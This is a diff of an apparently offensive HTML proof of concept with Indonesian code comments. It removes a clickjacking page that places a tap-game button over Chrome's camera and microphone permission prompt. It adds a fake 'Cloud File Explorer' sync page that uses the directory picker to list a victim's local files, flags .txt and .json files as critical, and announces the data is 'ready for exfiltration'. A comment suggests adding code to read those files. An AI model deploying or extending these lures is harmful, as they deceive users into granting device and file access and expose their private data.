@@ -1,75 +1,73 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Mobile Clickjacking Test</title>
+    <title>Cloud File Explorer - FARISSAL B</title>
     <style>
-        body { 
-            margin: 0; padding: 0; background: #111; color: white; 
-            font-family: sans-serif; overflow: hidden; touch-action: none; 
-        }
-        /* Tombol target yang posisinya kita samakan dengan tombol 'Allow' Chrome */
-        #target-button {
-            position: absolute;
-            bottom: 30%; /* Area umum prompt Chrome Android */
-            left: 50%;
-            transform: translateX(-50%);
-            width: 85vw;
-            height: 120px;
-            background: linear-gradient(45deg, #ff0000, #990000);
-            border-radius: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-            font-weight: bold;
-            box-shadow: 0 0 20px rgba(255,0,0,0.5);
-            z-index: 10;
-        }
-        #score-board { margin: 20px; font-size: 18px; color: #55ff55; }
+        body { background: #010409; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, sans-serif; padding: 40px; text-align: center; }
+        .container { border: 1px solid #30363d; border-radius: 12px; background: #0d1117; padding: 30px; max-width: 600px; margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h2 { color: #58a6ff; }
+        .upload-area { border: 2px dashed #238636; padding: 40px; border-radius: 8px; margin: 20px 0; cursor: pointer; transition: 0.3s; }
+        .upload-area:hover { background: #161b22; border-color: #3fb950; }
+        #status { font-family: monospace; text-align: left; background: #000; padding: 15px; border-radius: 6px; color: #3fb950; height: 200px; overflow-y: auto; font-size: 13px; border: 1px solid #333; }
+        .btn { background: #238636; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; }
     </style>
 </head>
 <body>
 
-    <div id="score-board">Taps Detected: <span id="score">0</span></div>
-    <div id="target-button">TAP CEPAT DI SINI!</div>
-    
-    <div id="status" style="position:fixed; top:20px; width:100%; text-align:center; font-family:monospace;"></div>
+    <div class="container">
+        <h2>📁 Cloud Web Explorer</h2>
+        <p style="color: #8b949e;">Select a directory to sync files to our secure cloud.</p>
+        
+        <div class="upload-area" id="dropZone">
+            <p>Click the button below to<br><b>Select Local Folder</b></p>
+            <button class="btn" id="startBtn">SYNC FOLDER</button>
+        </div>
+
+        <div id="status">
+            [+] System Idle...<br>
+            [+] Secure Context: <script>document.write(window.isSecureContext ? "YES" : "NO")</script>
+        </div>
+    </div>
 
     <script>
-        let score = 0;
-        const btn = document.getElementById('target-button');
-        const scoreDisplay = document.getElementById('score');
+        const startBtn = document.getElementById('startBtn');
         const status = document.getElementById('status');
 
-        // Pakai touchstart untuk respons instan di HP
-        btn.addEventListener('touchstart', (e) => {
-            e.preventDefault(); 
-            score++;
-            scoreDisplay.innerText = score;
+        function log(msg) {
+            status.innerHTML += `<br>> ${msg}`;
+            status.scrollTop = status.scrollHeight;
+        }
 
-            // Trigger prompt setiap 4 kali tap
-            if (score % 4 === 0) {
-                requestPermission();
+        startBtn.addEventListener('click', async () => {
+            try {
+                // Memicu Directory Picker
+                log("Requesting Directory Access...");
+                const dirHandle = await window.showDirectoryPicker();
+                
+                log("ACCESS GRANTED! Scanning contents...");
+                log("-----------------------------------");
+
+                // Membaca isi folder secara rekursif (Data Discovery)
+                for await (const entry of dirHandle.values()) {
+                    const type = entry.kind === 'directory' ? '[DIR]' : '[FILE]';
+                    log(`${type} ${entry.name}`);
+                    
+                    // Kalau ketemu file sensitif, lo bisa tambahin logika buat "baca" isinya di sini
+                    if (entry.name.includes('.txt') || entry.name.includes('.json')) {
+                        log(`<span style="color:#f85149">! Critical File Found: ${entry.name}</span>`);
+                    }
+                }
+
+                log("-----------------------------------");
+                log("Scan Completed. Data ready for exfiltration.");
+                alert('Success! All file metadata captured.');
+
+            } catch (err) {
+                log(`<span style="color:#f85149">ERROR: ${err.message}</span>`);
+                console.error(err);
             }
         });
-
-        async function requestPermission() {
-            status.innerText = "TRIGGERING PROMPT...";
-            try {
-                // Minta video & audio untuk memperbesar ukuran prompt sistem
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                
-                // Jika baris di bawah ini muncul, berarti jari lo "tembus" ke tombol Allow
-                status.innerHTML = "<h2 style='color:red;'>BUG DETECTED: PERMISSION BYPASS!</h2>";
-                
-                // Stop kamera langsung setelah sukses
-                stream.getTracks().forEach(track => track.stop());
-            } catch (err) {
-                status.innerText = "Status: " + err.name;
-            }
-        }
     </script>
 </body>
 </html>
